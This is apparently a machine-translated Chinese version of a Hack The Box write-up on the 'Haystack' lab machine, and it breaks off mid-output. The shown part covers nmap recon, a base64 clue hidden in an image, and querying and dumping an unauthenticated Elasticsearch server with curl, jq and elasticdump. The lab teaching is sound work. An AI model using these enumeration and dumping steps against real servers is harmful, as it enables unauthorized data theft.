<html>
<head>
<title>HacktheBox — Haystack</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">hack the box——干草堆</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-haystack-db3682804890?source=collection_archive---------0-----------------------#2019-11-02">https://infosecwriteups.com/hackthebox-haystack-db3682804890?source=collection_archive---------0-----------------------#2019-11-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/658b50b89a98f09c1bc11d3f1dfc0650.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/format:webp/1*a0mOlwfLuZFmD5V78z7VtQ.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated"><a class="ae jy" href="https://www.hackthebox.eu/home/machines/profile/195" rel="noopener ugc nofollow" target="_blank"> hackthebox.eu </a></figcaption></figure><p id="dec0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这是一篇关于我如何解决HacktheBox中的Haystack的文章。</p><p id="49a9" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated"><a class="ae jy" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>是一个在线平台，你可以在这里练习渗透测试技能。</p><p id="4c96" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">像往常一样，我试图解释我是如何从机器上理解这些概念的，因为我想真正理解事物是如何工作的。所以请，如果我误解了一个概念，请让我知道。</p><h1 id="64c4" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">关于盒子:</h1><p id="738a" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">这个盒子因为它的第一步而受到很多人的讨厌。它从图片中的一个base64字符串开始，您将在数据的“干草堆”中寻找它。之后，您将在框中获得SSH的凭证。然后，您必须利用Kibana中的LFI漏洞，然后创建一个将被Logstash接收的文件，从而以根用户身份执行代码。</p><h1 id="fdf8" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">侦察:</h1><p id="8513" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">我首先通过调用命令运行初始nmap扫描，将其保存到我的nmap目录中</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="d5bb" class="mj ky iq mf b gy mk ml l mm mn">nmap -sV -sC -oA nmap/initial 10.10.10.115</span></pre><p id="786a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">结果是:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="9804" class="mj ky iq mf b gy mk ml l mm mn">Nmap scan report for 10.10.10.115<br/>Host is up (0.72s latency).<br/>Not shown: 997 filtered ports<br/>PORT     STATE SERVICE VERSION<br/>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)<br/>|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)<br/>|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)<br/>80/tcp   open  http    nginx 1.12.2<br/>|_http-server-header: nginx/1.12.2<br/>|_http-title: Site doesn't have a title (text/html).<br/>9200/tcp open  http    nginx 1.12.2<br/>| http-methods: <br/>|_  Potentially risky methods: DELETE<br/>|_http-server-header: nginx/1.12.2<br/>|_http-title: Site doesn't have a title (application/json; charset=UTF-8).</span><span id="3b06" class="mj ky iq mf b gy mo ml l mm mn">Service detection performed. Please report any incorrect results at <a class="ae jy" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .<br/># Nmap done at Mon Jul  1 12:51:10 2019 -- 1 IP address (1 host up) scanned in 119.98 seconds</span></pre><p id="2629" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">注意，根据我的初始扫描，端口22(ssh)、端口80(使用nginx的http)和端口9200是打开的。端口80和端口9200上运行的nginx版本是相同的。</p><h2 id="07a6" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">端口80</h2><p id="c423" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">检查端口80，我得到的是这个:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi na"><img src="../Images/5b6510541c65af6bd857c6c4e6799fb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rsbPfKUzBTeNmBtNKy_qlQ.png"/></div></div></figure><p id="4107" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这是大海捞针的形象。然后我检查页面源代码:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/ef851a00f44fe480efc22404b86d93ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1098/format:webp/1*3takORasV262JGgoZaMUvA.png"/></div></figure><p id="863b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">所以页面只有图片。我下载它并使用exiftool检查它:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi ng"><img src="../Images/ef66ce11c6a8688ab91e2f7948279fce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lI-8XzVg8VCwFrJID6TQfg.png"/></div></div></figure><p id="840a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我还对文件运行了字符串，并在最后发现了一个base64编码的字符串:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/fcbaad157bf5f61731e6386dfc6ca902.png" data-original-src="https://miro.medium.com/v2/resize:fit:966/format:webp/1*6nipoa1j3pkWwadUjhRy7g.png"/></div></figure><p id="0b4b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我通过调用以下命令对其进行解码:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="05eb" class="mj ky iq mf b gy mk ml l mm mn">echo -n bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==|base64 -d</span></pre><p id="b730" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">输出是:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="2b9d" class="mj ky iq mf b gy mk ml l mm mn">la aguja en el pajar es "clave"</span></pre><p id="8ceb" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">由于它看起来像西班牙语，我很快就把它扔给谷歌翻译:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/f8287ec61468fedb4e5ba8dcbd7b6ee6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1272/format:webp/1*z0zRiFnGxNQoSlcrxm2-Qg.png"/></div></figure><p id="cca5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">注意，这个键放在引号中，它在西班牙语中的对应词是“clave”。</p><h2 id="0a2a" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">端口9200</h2><p id="5cc8" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">检查端口9200:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi nj"><img src="../Images/1deeac30fa008fb20ee54e825ba1a10a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z0WbfBuvFFH7o8pm_PvWHQ.png"/></div></div></figure><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi nk"><img src="../Images/90c3e2cf0f9225e5712a89d5d515cd4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EL8y-Pqp8gLX9I1LniRE3A.png"/></div></div></figure><p id="da97" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">它的弹性搜索。通读它的<a class="ae jy" href="https://www.elastic.co/guide/en/elasticsearch/reference/current/targz.html" rel="noopener ugc nofollow" target="_blank">文档</a>，发现默认情况下它监听端口9200(用于休息)。它还可以在端口9300上侦听节点通信。根据文件:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e174" class="mj ky iq mf b gy mk ml l mm mn">The <strong class="mf ir">Elasticsearch</strong> REST APIs are exposed using <a class="ae jy" href="https://www.elastic.co/guide/en/elasticsearch/reference/current/modules-http.html" rel="noopener ugc nofollow" target="_blank">JSON over HTTP</a>.</span></pre><h2 id="ffcc" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">列表索引:</h2><p id="50c7" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">我首先开始列出指数:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="006f" class="mj ky iq mf b gy mk ml l mm mn">curl <a class="ae jy" href="http://10.10.10.115:9200/_cat/indices?v" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/_cat/indices?v</a></span></pre><p id="39e0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这将返回集群中索引的高级信息。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/adc3ed29f6d14be0b58a1f26bb13a69f.png" data-original-src="https://miro.medium.com/v2/resize:fit:894/format:webp/1*NIuInTWEVBNyy4yhDHd-AQ.png"/></div></figure><p id="4b59" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">有3个索引:。kibana(默认)、报价和银行。</p><p id="93bd" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我可以使用以下格式在索引上运行搜索:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="2067" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/bank/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/&lt;index&gt;/_search</a></span></pre><p id="15bd" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我在银行索引上查了一下:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="2b56" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/bank/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/bank/_search</a></span></pre><p id="647a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这会返回大量的JSON数据:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="5342" class="mj ky iq mf b gy mk ml l mm mn">"took":2,"timed_out":false,"_shards":{"total":5,"successful":5,"skipped":0,"failed":0},"hits":{"total":1000,"max_score":1.0,"hits":[{"_index":"bank","_type":"account","_id":"25","_score":1.0,"_source":{"account_number":25,"balance":40540,"firstname":"Virginia","lastname":"Ayala","age":39,"gender":"F","address":"171 Putnam Avenue","employer":"Filodyne","email":"<a class="ae jy" href="mailto:virginiaayala@filodyne.com" rel="noopener ugc nofollow" target="_blank">virginiaayala@filodyne.com</a>","city":"Nicholson","state":"PA"}},{"_index":"bank","_type":"account","_id":"44","_score":1.0,"_source":{"account_number":44,"balance":34487,"firstname":"Aurelia","lastname":"Harding","age":37,"gender":"M","address":"502 Baycliff Terrace","employer":"Orbalix","email":"<a class="ae jy" href="mailto:aureliaharding@orbalix.com" rel="noopener ugc nofollow" target="_blank">aureliaharding@orbalix.com</a>","city":"Yardville","state":"DE"}},{"_index":"bank","_type":"account","_id":"99","_score":1.0,"_source":{"account_number":99,"balance":47159,"firstname":"Ratliff","lastname":"Heath","age":39,"gender":"F","address":"806 Rockwell Place","employer":"Zappix","email":"<a class="ae jy" href="mailto:ratliffheath@zappix.com" rel="noopener ugc nofollow" target="_blank">ratliffheath@zappix.com</a>","city":"Shaft","state":"ND"}},{"_index":"bank","_type":"account","_id":"119","_score":1.0,"_source":{"account_number":119,"balance":49222,"firstname":"Laverne","lastname":"Johnson","age":28,"gender":"F","address":"302 Howard Place","employer":"Senmei","email":"<a class="ae jy" href="mailto:lavernejohnson@senmei.com" rel="noopener ugc nofollow" target="_blank">lavernejohnson@senmei.com</a>","city":"Herlong","state":"DC"}},{"_index":"bank","_type":"account","_id":"126","_score":1.0,"_source":{"account_number":126,"balance":3607,"firstname":"Effie","lastname":"Gates","age":39,"gender":"F","address":"620 National Drive","employer":"Digitalus","email":"<a class="ae jy" href="mailto:effiegates@digitalus.com" rel="noopener ugc nofollow" target="_blank">effiegates@digitalus.com</a>","city":"Blodgett","state":"MD"}},{"_index":"bank","_type":"account","_id":"145","_score":1.0,"_source":{"account_number":145,"balance":47406,"firstname":"Rowena","lastname":"Wilkinson","age":32,"gender":"M","address":"891 Elton Street","employer":"Asimiline","email":"<a class="ae jy" href="mailto:rowenawilkinson@asimiline.com" rel="noopener ugc nofollow" target="_blank">rowenawilkinson@asimiline.com</a>","city":"Ripley","state":"NH"}},{"_index":"bank","_type":"account","_id":"183","_score":1.0,"_source":{"account_number":183,"balance":14223,"firstname":"Hudson","lastname":"English","age":26,"gender":"F","address":"823 Herkimer Place","employer":"Xinware","email":"<a class="ae jy" href="mailto:hudsonenglish@xinware.com" rel="noopener ugc nofollow" target="_blank">hudsonenglish@xinware.com</a>","city":"Robbins","state":"ND"}},{"_index":"bank","_type":"account","_id":"190","_score":1.0,"_source":{"account_number":190,"balance":3150,"firstname":"Blake","lastname":"Davidson","age":30,"gender":"F","address":"636 Diamond Street","employer":"Quantasis","email":"<a class="ae jy" href="mailto:blakedavidson@quantasis.com" rel="noopener ugc nofollow" target="_blank">blakedavidson@quantasis.com</a>","city":"Crumpler","state":"KY"}},{"_index":"bank","_type":"account","_id":"208","_score":1.0,"_source":{"account_number":208,"balance":40760,"firstname":"Garcia","lastname":"Hess","age":26,"gender":"F","address":"810 Nostrand Avenue","employer":"Quiltigen","email":"<a class="ae jy" href="mailto:garciahess@quiltigen.com" rel="noopener ugc nofollow" target="_blank">garciahess@quiltigen.com</a>","city":"Brooktrails","state":"GA"}},{"_index":"bank","_type":"account","_id":"222","_score":1.0,"_source":{"account_number":222,"balance":14764,"firstname":"Rachelle","lastname":"Rice","age":36,"gender":"M","address":"333 Narrows Avenue","employer":"Enaut","email":"<a class="ae jy" href="mailto:rachellerice@enaut.com" rel="noopener ugc nofollow" target="_blank">rachellerice@enaut.com</a>","city":"Wright","state":"AZ"}}]}}</span></pre><p id="c4b4" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我可以将它传输到jq并过滤前30个结果:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="4775" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/bank/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/bank/_search</a> | jq . | head -n 30</span></pre><p id="2c88" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">输出是:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/01a8b800ca855be23f2d2e1a00aa689a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1076/format:webp/1*CV0-4t3utVrL1Uoht0mrnw.png"/></div></figure><p id="4fd5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">因为它的JSON，它是一个名称值对。然后我可以使用jq查询进行过滤。我将尝试列出所有带有balance名称的值。要做到这一点:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="4586" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/bank/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/bank/_search</a> | jq -r '.hits | .hits | .[] | ._source | .balance'</span></pre><p id="8603" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">上面的命令将<em class="nn"> _search </em>寻找索引<em class="nn"> bank，</em>将其传送到来自jq的查询，该查询在名称<em class="nn"> hits </em>中查找值，然后再次搜索<em class="nn"> hits </em>中的值(其值是数组<em class="nn">)。[] </em>)，并在名称<em class="nn"> _source </em>中查找该值。我这样做是为了练习jq😂</p><p id="0653" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我得到这样的输出:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="04d6" class="mj ky iq mf b gy mk ml l mm mn">40540<br/>34487<br/>47159<br/>49222<br/>3607<br/>47406<br/>14223<br/>3150<br/>40760<br/>14764</span></pre><p id="9b31" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">由于指数银行中没有什么有趣的东西，我转到了报价。</p><h2 id="3295" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">引用</h2><p id="6355" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">检查前20行:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="4f42" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/quotes/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/quotes/_search</a> | jq . | head -n 20</span></pre><p id="2ff3" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">输出是:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="defc" class="mj ky iq mf b gy mk ml l mm mn">{<br/>  "took": 1,<br/>  "timed_out": false,<br/>  "_shards": {<br/>    "total": 5,<br/>    "successful": 5,<br/>    "skipped": 0,<br/>    "failed": 0<br/>  },<br/>  "hits": {<br/>    "total": 253,<br/>    "max_score": 1,<br/>    "hits": [<br/>      {<br/>        "_index": "quotes",<br/>        "_type": "quote",<br/>        "_id": "14",<br/>        "_score": 1,<br/>        "_source": {<br/>          "quote": "En América se desarrollaron importantes civilizaciones, como Caral</span></pre><p id="ff3b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">由于结构是hits → hits → _source → quote，我可以调用下面的命令来获取quote字段，获取前20行，并再次通过管道将它传递给jq(因为如果将jq的输出传递给bash命令，它会丢失其格式):</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="2c0b" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/quotes/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/quotes/_search</a> | jq -r '.hits | .hits |.[] | ._source ' | head -n 20 | jq .</span></pre><p id="8158" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">输出是:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="a323" class="mj ky iq mf b gy mk ml l mm mn">{<br/>  "quote": "En América se desarrollaron importantes civilizaciones, como Caral (la civilización más antigua de América, la cual se desarrolló en la zona central de Perú), los anasazi, los indios pueblo, quimbaya, nazca, chimú, chavín, paracas, moche, huari, lima, zapoteca, mixteca, totonaca, tolteca, olmeca y chibcha, y las avanzadas civilizaciones correspondientes a los imperios de Teotihuacan, Tiahuanaco, maya, azteca e inca, entre muchos otros."<br/>}<br/>{<br/>  "quote": "Imperios español y portugués en 1790."<br/>}<br/>{<br/>  "quote": "También se instalaron en América del Sur repúblicas de pueblos de origen africano que lograron huir de la esclavitud a la que habían sido reducidos por los portugueses, como el Quilombo de los Palmares o el Quilombo de Macaco."<br/>}<br/>{<br/>  "quote": "En 1804, los esclavos de origen africano de Haití se sublevaron contra los colonos franceses, declarando la independencia de este país y creando el primer estado moderno con gobernantes afroamericanos."<br/>}<br/>{<br/>  "quote": "A partir de 1809,23​ los pueblos bajo dominio de España llevaron adelante una Guerra de Independencia Hispanoamericana, de alcance continental, que llevó, luego de complejos procesos, al surgimiento de varias naciones: Argentina, Bolivia, Colombia, Costa Rica, Panamá, Chile, Ecuador, El Salvador, Guatemala, Honduras, México, Nicaragua, Paraguay, Perú, Uruguay y Venezuela. En 1844 y 1898 el proceso se completaría con la independencia de República Dominicana y Cuba, respectivamente."<br/>}<br/>{<br/>  "quote": "En 1816, se conformó un enorme estado independiente sudamericano, denominado Gran Colombia, y que abarcó los territorios de los actuales Panamá, Colombia, Venezuela y Ecuador y zonas de Brasil, Costa Rica, Guyana, Honduras, Nicaragua y Perú. La República se disolvió en 1830."<br/>}</span></pre><p id="1467" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我得到了一堆引用。如果我翻译一段较短的引言:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi no"><img src="../Images/2e8e34b0f852a4943fdd1910ee6d8e2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1260/format:webp/1*T398baJV-4uNTkHjHiGtAQ.png"/></div></figure><p id="ad74" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">没什么有用的。它们只是一堆句子。然后，我试图从西班牙语的输出中搜索“clave”(只是纯粹的猜测)，但我什么也没得到。</p><p id="c213" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">由于我可能没有得到所有的数据，也只是略知皮毛，于是我寻找一种工具，可以从一个索引中转储所有的数据，然后从那里进行过滤。我偶然发现了elasticsearch-dump。</p><div class="np nq gp gr nr ns"><a href="https://github.com/taskrabbit/elasticsearch-dump" rel="noopener  ugc nofollow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">taskrabbit/elasticsearch-dump</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">移动和保存索引的工具。elastic dump 1 . 0 . 0版更改了转储创建的文件的格式…</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">github.com</p></div></div><div class="ob l"><div class="oc l od oe of ob og js ns"/></div></div></a></div><p id="293e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我可以从每个索引中转储数据。由于解码的base64中有一点西班牙语，我将首先转储引号索引，因为它的内容也有西班牙语。</p><p id="6c77" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">映射数据:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="0955" class="mj ky iq mf b gy mk ml l mm mn">elasticsearch-dump/bin/elasticdump --input=<a class="ae jy" href="http://10.10.10.115:9200/quotes" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/quotes</a> --output=writeup/quote.mapping.json --type=mapping</span></pre><p id="eb67" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">转储数据:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="ec9f" class="mj ky iq mf b gy mk ml l mm mn">elasticsearch-dump/bin/elasticdump --input=<a class="ae jy" href="http://10.10.10.115:9200/quotes" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/quotes</a> --output=writeup/quote.data.json --type=data</span></pre><p id="ba26" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">根据我之前的操作，我可以在搜索报价时检查前20行:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="ee83" class="mj ky iq mf b gy mk ml l mm mn">cat quote.data.json | jq -r '._source' | head -n 20 | jq .</span></pre><p id="2c37" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">输出是:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="55e1" class="mj ky iq mf b gy mk ml l mm mn">{<br/>  "quote": "En América se desarrollaron importantes civilizaciones, como Caral (la civilización más antigua de América, la cual se desarrolló en la zona central de Perú), los anasazi, los indios pueblo, quimbaya, nazca, chimú, chavín, paracas, moche, huari, lima, zapoteca, mixteca, totonaca, tolteca, olmeca y chibcha, y las avanzadas civilizaciones correspondientes a los imperios de Teotihuacan, Tiahuanaco, maya, azteca e inca, entre muchos otros."<br/>}<br/>{<br/>  "quote": "Imperios español y portugués en 1790."<br/>}<br/>{<br/>  "quote": "También se instalaron en América del Sur repúblicas de pueblos de origen africano que lograron huir de la esclavitud a la que habían sido reducidos por los portugueses, como el Quilombo de los Palmares o el Quilombo de Macaco."<br/>}<br/>{<br/>  "quote": "En 1804, los esclavos de origen africano de Haití se sublevaron contra los colonos franceses, declarando la independencia de este país y creando el primer estado moderno con gobernantes afroamericanos."<br/>}</span></pre><p id="8580" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">前面的输出看起来很相似，但是当我使用tail检查最后一个报价值时:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="7da4" class="mj ky iq mf b gy mk ml l mm mn">cat quote.data.json | jq -r '._source' | tail -n 20</span></pre><p id="0c3f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">输出与之前不同:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="cd88" class="mj ky iq mf b gy mk ml l mm mn">{<br/>"quote": "A pesar de ser considerada como una ciudad «relativamente segura», el nivel de temor en la población ha crecido de manera importante en el último tiempo. En 2007, un 22 % de su población manifestaba un «alto temor» de sufrir algún tipo de crimen en su contra, mientras en años anteriores las cifras eran considerablemente menores (en 2000 era de un 13,4 % y en 2005 de un 15,8 %). En comparación con otras ciudades del país, el promedio de este índice fuera de la capital es de un 15,9 % e incluso esta cifra es mayor que en las ciudades con mayor tasa de victimización: Iquique y Talca que poseen un 37,5 % y 35,9 % de victimización, sólo un 17,7 % y un 18,9 % de la población respectiva manifiesta un «alto temor». En el desglose por comunas, nuevamente las cifras más bajas están en el sector oriente, con Ñuñoa con un 10 %, y las más altas en El Bosque, con un 32,5 %.100​ Este alto grado de inseguridad que siente la población ha sido descrito como producto de las enormes brechas que diferencian a los habitantes de la ciudad y el rol de los medios de comunicación, entre otros.102"<br/>}</span></pre><p id="b1ec" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">由于这是一个与我之前能够查询的数据不同的数据，我针对整个转储再次搜索字符串“clave ”:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="6423" class="mj ky iq mf b gy mk ml l mm mn">cat quote.data.json | grep clave</span></pre><p id="163b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">输出是:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e083" class="mj ky iq mf b gy mk ml l mm 